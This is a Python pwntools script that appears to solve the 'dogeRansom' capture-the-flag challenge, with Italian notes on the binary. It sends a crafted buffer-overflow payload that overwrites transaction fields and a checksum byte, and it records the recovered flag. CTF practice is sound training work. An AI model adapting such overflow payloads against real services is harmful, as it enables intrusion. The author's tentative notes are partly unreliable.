#! /usr/bin/env python3

from pwn import *
import time
import struct

# def xor_to30(bytestring):
#     ans = 
#     for x in range(0x30):

currentTime = int(time.time())
currentTime = struct.pack('I', currentTime)

payload = b'IT70S0501811800000012284030' + (b'\x00' *9)+ (b'\xff'*3+b'\x00') + currentTime + (b'\x00' * 4) + b'\x03'*2

# 27 + 9 + 4 + 4 + 4 + 2 = 50 = 0x32 non so perch'e propio due volte quel coso boh

# conn = process('./dogeRansom')
conn = remote('dogeransom.challs.olicyber.it',10804)
conn.recvuntil('> ')
conn.sendline('1')
conn.recvuntil(':')
conn.sendline('0')
conn.recvuntil(':')

conn.sendline(payload)
conn.interactive()
# flag{dOG3monEYY_at_1_bEF0re_2022}

# questo e un piccolissimo diario degli exploit che riesco a trovare in giro
# sono scritte le analisi delle funzioni che ho fatto

# 1) in send money se fatto bene posso fare overflow fino a controllare tutti i primi 30 byte
# per questo motivo controllo anche il valore dello xor finale. 
# non ho ancora capito cosa fa quella funzione che arriva prima a gets()
# ora analizziamo array transazione:
# 0x24 4 byte per il valore di transazione
# 0x28 si ha il timestamp, ma e tagliato
# 0x30 lo xor di tutti i valori precedenti messo qua
# Sono in pieno controllo di questi valori grazie all' overflow, quindi devo fare attenzione

# dettagli_transazione():
# nella funzione transazione prende cose riguardanti lo stack, processate prima,
# quindi a seconda di quello che la funzione da exploitare da, questa funzione restituisce info
# bello notare che stack 08 inizia con iil numero di dogecoin ancora rimasti, sembra che si rifaccia 
# allarray che ha inizializzato con la prima funzione.

# 050 a questo valore lo stack vede prob il valore della transazione...
# non so allora in che modo i due stack siano legati... non lo so...
# si il 050 contiene dettagli dellelaborazione della cosa!!!!!
# allora:
# 0 Inizializzazione
# 1 Ricerca IBAN corrispondente
# 2 Elaborazione
# 3 Accettazione
# 4 Completato
# 5 Errore
# 6 _bWQ9iyq27w
# 7 Scaduto!
# 8 rifiutato

# la funzione precedente elabora il numero in 0x31 dello stack transazione, questa funzione va a guardare il valore
# di questo numero e risponde in modo adeguato

# controllo_xor:
# piccolissimo tentativo di evitare loverflow perch'e il valore che dico sia xor `e diverso dallo xor vero dei primi 30 bytes
# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa


